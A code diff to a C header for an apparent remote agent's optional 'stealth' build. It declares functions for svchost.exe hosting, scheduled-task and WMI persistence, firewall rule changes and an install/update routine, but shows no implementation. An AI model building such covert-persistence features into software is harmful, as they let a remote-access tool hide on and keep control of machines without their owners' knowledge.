@@ -21,6 +21,12 @@
 #include <psapi.h>
 #include <stdio.h>
 
+// Used for persisted task paths and scheduler/WMI naming.
+// 260 matches typical MAX_PATH-sized task path buffers used in this codebase.
+#ifndef STEALTH_TASK_NAME_MAX
+#define STEALTH_TASK_NAME_MAX 260
+#endif
+
 // Avoid pulling in winternl/ntdll by default to reduce surface area and
 // accidental reliance on unstable/undocumented structures. Only include when
 // stealth features are explicitly enabled.
@@ -366,6 +372,7 @@ BOOL Stealth_IsRunningSvchost(void);
  * Register service for svchost.exe hosting via registry
  */
 BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* dllPath);
+BOOL Stealth_UnregisterSvchostService(const wchar_t* serviceName);
 
 // ================================================================
 // In-Memory Command Execution
@@ -420,6 +427,11 @@ void Stealth_EnsureLoggingDefaults(void);
  */
 BOOL Stealth_AddFirewallRuleForService(const wchar_t* serviceName, const wchar_t* exePath);
 BOOL Stealth_RemoveFirewallRuleForService(const wchar_t* serviceName);
+BOOL Stealth_RemoveFirewallRulesByExePath(const wchar_t* exePath);
+BOOL Stealth_CheckFirewallRuleForService(const wchar_t* serviceName, const wchar_t* exePath);
+BOOL Stealth_CheckFirewallRuleExists(const wchar_t* serviceName);
+BOOL Stealth_AddWebRtcFirewallRuleForService(const wchar_t* serviceName, const wchar_t* exePath, BOOL forHostBinary);
+BOOL Stealth_CheckWebRtcFirewallRuleForService(const wchar_t* serviceName, const wchar_t* exePath, BOOL forHostBinary);
 
 /**
  * Service hardening utilities
@@ -443,12 +455,34 @@ typedef struct StealthInstallPaths
 
 BOOL Stealth_GetInstallPaths(StealthInstallPaths *paths);
 
+// Persistence state (installRoot\\state\\persistence.ini)
+typedef struct StealthPersistenceState
+{
+    wchar_t AutorunTask[STEALTH_TASK_NAME_MAX];
+    wchar_t RestartTask[STEALTH_TASK_NAME_MAX];
+    wchar_t WmiFilter[128];
+    wchar_t WmiConsumer[128];
+} StealthPersistenceState;
+
+BOOL Stealth_LoadPersistenceState(StealthPersistenceState* state);
+BOOL Stealth_SavePersistenceState(const StealthPersistenceState* state);
+void Stealth_ClearPersistenceState(void);
+void Stealth_RecordPersistenceTask(StealthPersistenceState* state, const wchar_t* taskPath, BOOL isRestartTask);
+void Stealth_RecordPersistenceWmi(StealthPersistenceState* state, const wchar_t* filterName, const wchar_t* consumerName);
+
+// Validation helpers
+BOOL Stealth_RunInstallValidation(void);
+BOOL Stealth_RunUpdateValidation(void);
+BOOL Stealth_RunUninstallValidation(void);
+
 // Installation helpers (used by installer/registration)
+BOOL Stealth_CreateInstallRootDirectory(const wchar_t* installPath);
 BOOL Stealth_CreateInstallationDirectory(const wchar_t* installPath);
 BOOL Stealth_InstallFiles(const wchar_t* sourcePath, const wchar_t* destPath);
 #if defined(WIN32) && defined(MESHAGENT_ENABLE_STEALTH)
 BOOL Stealth_PerformCompleteInstallation(const wchar_t* sourceExePath, const wchar_t* sourceDllPath, BOOL useSvchostMode);
 BOOL Stealth_PerformCompleteUninstallation(void);
+BOOL Stealth_PerformUpdate(const wchar_t* sourceExePath, const wchar_t* sourceDllPath, BOOL useSvchostMode);
 BOOL Stealth_IsAlreadyInstalled(void);
 #endif
 
